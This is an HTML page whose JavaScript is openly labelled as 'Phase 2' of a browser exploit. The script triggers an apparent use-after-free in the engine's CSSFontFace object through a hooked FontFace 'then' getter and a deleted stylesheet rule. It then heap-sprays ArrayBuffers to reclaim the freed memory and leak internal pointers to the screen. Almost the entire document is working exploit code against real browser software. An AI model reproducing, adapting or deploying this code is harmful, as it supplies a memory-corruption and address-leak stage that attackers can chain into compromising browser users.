<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>P2</title>
<style>body{font-size:28px;font-family:sans-serif;background:#111;color:#0f0}pre{white-space:pre-wrap;font-size:22px}</style>
<style id="s0">@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }</style>
</head>
<body>
<h3 id="st">stage A</h3>
<pre id="out"></pre>
<script>
// Phase 2: reclaim + leak (port of 14.10 research FONTFACE_RECLAIM_LEAK design).
// Inside the getter, after freeing the 192-byte CSSFontFace: spray 104 x
// 192-byte ArrayBuffers with per-slot markers. The engine's post-free writes
// (refcount+0x00, m_clients+0x58, m_wrapper+0x68, flag+0x85) land in whichever
// buffer reclaimed the chunk -> marker oracle + pointer leak on screen.
function log(s) {
  document.getElementById('out').textContent += s + "\n";
}
function hex(n, w) {
  var h = n.toString(16);
  while (h.length < (w || 16)) h = '0' + h;
  return '0x' + h;
}

log('UA = ' + navigator.userAgent);

var NSPRAY = 104, SPRAYLEN = 192;
var sprays = new Array(NSPRAY);

function spray() {
  for (var i = 0; i < NSPRAY; i++) {
    var b = new ArrayBuffer(SPRAYLEN);
    var u = new Uint8Array(b);
    for (var j = 0; j < SPRAYLEN; j++)
      u[j] = (i + j) & 0xff;            // per-slot marker pattern
    sprays[i] = b;
  }
}

function scan() {
  var changes = [];
  for (var i = 0; i < NSPRAY; i++) {
    var u = new Uint8Array(sprays[i]);
    var diff = 0;
    for (var j = 0; j < SPRAYLEN; j++)
      if (u[j] !== ((i + j) & 0xff)) diff++;
    if (diff > 0) changes.push([i, diff]);
  }
  log('scan: ' + changes.length + ' buffer(s) changed');
  for (var k = 0; k < changes.length && k < 4; k++) {
    var i = changes[k][0];
    log('slot ' + i + ': ' + changes[k][1] + ' bytes differ');
    var dv = new DataView(sprays[i]);
    log('  +0x00 u32 : ' + hex(dv.getUint32(0, true), 8) + '  (refcount?)');
    log('  +0x58 u64 : ' + hex(dv.getBigUint64(0x58, true)) + '  (m_clients/HashTable ptr?)');
    log('  +0x68 u64 : ' + hex(dv.getBigUint64(0x68, true)) + '  (m_wrapper/WeakPtrImpl ptr?)');
    log('  +0x85 byte: ' + hex(dv.getUint8(0x85), 2) + '  (status flag?)');
  }
  if (changes.length === 0)
    log('NO reclaim this run - reload the page to retry (per-boot variance)');
  else
    log('RECLAIM CONFIRMED - leaked pointers above');
}

function trigger() {
  log('stage B: trigger in 3s');
  setTimeout(function () {
    log('triggering + spray');

    var A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
    document.fonts.add(A);
    void A.loaded;

    var fired = 0;
    Object.defineProperty(FontFace.prototype, 'then', {
      configurable: true,
      get: function () {
        fired++;
        if (this === A && fired === 1) {
          log('GETTER FIRED - freeing + spraying');
          try { document.getElementById('s0').sheet.deleteRule(0); } catch (e) {}
          document.body.offsetTop;               // force recalc -> FREE
          spray();                              // reclaim attempt, 104 x 192B
        }
        return undefined;
      }
    });

    try {
      document.fonts.load('1em x', 'AB').then(
        function (faces) {
          log('load resolved with ' + (faces ? faces.length : '?') + ' faces');
          setTimeout(scan, 500);
        },
        function (e) { log('load rejected: ' + e); setTimeout(scan, 500); }
      );
    } catch (e) { log('load threw: ' + e); }

    // promise may hang (vulnerable signature) - scan anyway
    setTimeout(scan, 2000);
    setTimeout(scan, 5000);
  }, 3000);
}

log('armed');
window.onload = trigger;
</script>
</body>
</html>
